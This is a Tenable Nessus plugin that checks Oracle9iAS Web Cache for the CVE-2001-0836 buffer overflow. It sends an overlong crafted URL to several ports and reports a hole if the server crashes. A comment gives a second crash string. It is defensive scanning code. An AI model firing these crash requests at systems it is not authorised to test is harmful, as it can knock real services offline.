#
# (C) Tenable Network Security, Inc.
#

# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0
#

include("compat.inc");

if (description)
{
 script_id(11081);
 script_version("$Revision: 1.29 $");
 script_cvs_date("$Date: 2014/07/11 18:33:06 $");

 script_cve_id("CVE-2001-0836");
 script_bugtraq_id(3443);
 script_osvdb_id(5534);

 script_name(english:"Oracle Application Server Web Cache HTTP Request Overflow");
 script_summary(english:"Oracle9iAS buffer overflow");

 script_set_attribute(attribute:"synopsis", value:"It may be possible to execute arbitrary code on the remote system.");
 script_set_attribute(attribute:"description", value:
"It may be possible to make the Oracle9i application server crash or
execute arbitrary code by sending it a too long url specially crafted
URL.");
 # http://web.archive.org/web/20041204191924/http://www.oracle.com/technology/deploy/security/pdf/webcache.pdf
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a96c1e5e");
 script_set_attribute(attribute:"solution", value:"Apply vendor-supplied patches.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/10/18");
 script_set_attribute(attribute:"patch_publication_date", value:"2001/10/18");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/14");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:application_server_web_cache");
 script_end_attributes();


 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Databases");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 1100, 4000, 4001, 4002);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

ports = add_port_in_list(list:get_kb_list("Services/www"), port:1100);
ports = add_port_in_list(list:ports, port:4000);
ports = add_port_in_list(list:ports, port:4001);
ports = add_port_in_list(list:ports, port:4002);

foreach port (ports)
{
 if(!http_is_dead(port:port))
 {
  url = string("/", crap(data: "A", length: 3095), crap(data: "N", length: 4));
  w = http_send_recv3(method:"GET", item: url, port: port);
  if(http_is_dead(port: port, retry:1)) {
	security_hole(port);
	set_kb_item(name:"www/too_long_url_crash", value:TRUE);
  }
 }
}

# Note: sending 'GET /<3571 x A> HTTP/1.0' will kill it too.
